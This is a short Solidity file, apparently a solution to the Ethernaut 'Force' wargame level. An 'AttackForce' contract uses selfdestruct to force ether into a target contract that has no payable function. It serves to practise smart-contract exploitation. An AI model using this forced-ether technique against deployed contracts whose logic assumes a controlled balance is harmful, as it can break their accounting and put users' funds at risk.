/**
 *Submitted for verification at Etherscan.io on 2021-03-16
*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {
    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
/*
                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract AttackForce {
    function deposit() public payable {

    }
    
    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
    
    function sendMoneyToForce(address _to, uint _price) public {
        address payable reciver = payable(_to);
        reciver.transfer(_price);
    }
    
    function distroy(address payable _to) public {
        
        selfdestruct(_to);
    }
}